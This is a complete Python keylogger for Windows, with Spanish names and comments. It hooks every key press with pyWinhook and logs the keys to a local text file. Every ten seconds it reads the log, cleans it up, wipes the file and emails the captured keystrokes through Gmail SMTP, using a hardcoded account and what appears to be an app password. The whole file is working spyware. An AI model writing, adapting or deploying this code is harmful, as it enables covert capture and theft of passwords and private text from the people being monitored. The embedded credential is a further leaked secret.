import pyWinhook
import pythoncom
import logging
import time 
import datetime

carpeta_destino="C:\\Users\Alexis\Desktop\Keylogger\Keylogger.txt"
segundos_espera= 10
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def Enviar_Email():
    with open(carpeta_destino, "r+") as f: 
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        # Correcciones básicas
        data = data.replace("Space", " ")     # convertir "Space" → espacio real
        data = data.replace("Lcontrol", "")   # eliminar Left Control
        data = data.replace("Rcontrol", "")   # eliminar Right Control
        data = data.replace("Return", "\n")   # convertir "Return" → salto de línea
        data = data.replace("Back", "")       # opcional: eliminar "Backspace"
        data = "Mensaje enviado a las " + fecha + "\n" + data
        f.seek(0)
        f.truncate()
        Crear_Email(
            user='juanchitoprime1@gmail.com',
            contra='ssfvcpgsaebongad',  
            recep='juanchitoprime1@gmail.com',
            subj='Nueva Captura: ',
            boddy=data
        )
       
        

def Crear_Email(user, contra, recep, subj, boddy):
    import smtplib

    From = user
    To = recep
    Txt = boddy
    mailUser = user
    mailPass = contra  # Usa el argumento recibido

    email = f"From: {From}\nTo: {To}\nSubject: {subj}\n\n{Txt}"

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print("Correo enviado")
    except Exception as e:
        print('Correo fallido:' , e) 

def  Guardar_Evento(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    print('Window Name:', event.WindowName)
    print('Window:', event.Window)
    print('key:', event.Key) #Sirve para ver la tecla que se presiona
    logging.log(10, event.Key)   
    return True

hooks_mmanager = pyWinhook.HookManager() #Gestor de eventos
hooks_mmanager.KeyDown = Guardar_Evento
hooks_mmanager.HookKeyboard()


while True:
    if TimeOut():
        Enviar_Email()
        timeout=time.time()+ segundos_espera
    pythoncom.PumpWaitingMessages()  


